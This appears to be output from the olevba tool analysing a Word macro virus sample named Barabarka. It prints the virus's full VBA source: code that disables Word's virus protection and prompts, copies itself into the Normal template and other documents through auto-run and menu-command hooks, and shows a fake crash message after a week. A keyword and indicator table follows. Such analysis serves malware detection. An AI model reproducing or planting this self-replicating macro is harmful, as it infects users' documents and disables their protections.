olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Barabarka-e5f0b84c68477066b1b08f839cb47c8f64dbd90c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Barabarka-e5f0b84c68477066b1b08f839cb47c8f64dbd90c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Virus.bas 
in file: Virus.MSWord.Barabarka-e5f0b84c68477066b1b08f839cb47c8f64dbd90c - OLE stream: 'Macros/VBA/Virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Virus()
On Error Resume Next
' *********************
' Ďđîöĺäóđŕ đŕçěíîćĺíč˙
' *********************

If Options.ConfirmConversions = True Then Options.ConfirmConversions = Not (Options.ConfirmConversions)
If Options.VirusProtection = True Then Options.VirusProtection = Not (Options.VirusProtection)
If Options.SaveNormalPrompt = True Then Options.SaveNormalPrompt = Not (Options.SaveNormalPrompt)
ActiveDocument.VBProject.VBComponents("Virus").Export "C:\windows\Sys.inf"
ActiveDocument.ReadOnlyRecommended = False
' Ĺńëč řŕáëîí íĺ číôčöčđîâŕí, çŕďîěíčňü äŕňó çŕđŕćĺíč˙
If NormalTemplate.VBProject.VBComponents.Item("Virus").Name <> "Virus" Then
    Open "C:\windows\Date.inf" For Output As #1
    Print #1, CDbl(Date)
    Close #1
End If
' Çŕďóńę îńíîâíîé ďđîöĺäóđű âčđóńŕ
Call Pizdec

With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "Ďđčâĺň îň Áŕđŕáŕęč !!!"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("Virus").Name <> "Virus" Then var1 = True
If ActiveDocument.VBProject.VBComponents.Item("Virus").Name <> "Virus" Then var2 = True
If var1 = True And var2 = False Then Set Var3 = NormalTemplate.VBProject.VBComponents
If var1 = False And var2 = True Then Set Var3 = ActiveDocument.VBProject.VBComponents
Var3.import "C:\windows\Sys.inf"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If var2 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Virus
End Sub
Sub AutoClose()
On Error Resume Next
    Call Virus
End Sub
Sub HelpAbout()
On Error Resume Next
    Call Virus
Call A1
End Sub
Sub FileSave()
On Error Resume Next
Call Virus
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call Virus
End Sub
Sub Pizdec()
On Error Resume Next
' *************************************
' *    Îńíîâíŕ˙ ďđîöĺäóđŕ âčđóńŕ      *
' *************************************

' ×ňĺíčĺ äŕňű çŕđŕćĺíč˙
Open "C:\windows\Date.inf" For Input As #1
Input #1, KontrDate
Close #1
' Ĺńëč ńî âđĺěĺíč çŕđŕćĺíč˙ ďđîřëŕ íĺäĺë˙, ŕęňčâčđîâŕňü âčđóń
If CDbl(Date) - KontrDate >= 7 Then
    MsgBox "Ňĺęńňîâűé đĺäŕęňîđ âűďîëíčë íĺ÷ňî íĺäîďóńňčěîĺ. Ďĺđĺóńňŕíîâčňĺ îôčń !!!", vbCritical
End If
End Sub
Sub FilePrint()
    On Error Resume Next
' Dialogs(wdDialogFilePrint).Show
Dialogs(wdDialogFilePrint).Show
Call Virus
End Sub
Sub FilePageSetup()
On Error Resume Next
' ×ňĺíčĺ äŕňű çŕđŕćĺíč˙
Call Virus
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Virus
    MsgBox "Ňĺęńňîâűé đĺäŕęňîđ âűďîëíčë íĺ÷ňî íĺäîďóńňčěîĺ. Ďĺđĺóńňŕíîâčňĺ îôčń !!!", vbCritical
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Virus
    MsgBox "Ňĺęńňîâűé đĺäŕęňîđ âűďîëíčë íĺ÷ňî íĺäîďóńňčěîĺ. Ďĺđĺóńňŕíîâčňĺ îôčń !!!", vbCritical
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Virus
    MsgBox "Ňĺęńňîâűé đĺäŕęňîđ âűďîëíčë íĺ÷ňî íĺäîďóńňčěîĺ. Ďĺđĺóńňŕíîâčňĺ îôčń !!!", vbCritical
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Sys.inf             |Executable file name                         |
|IOC       |Date.inf            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

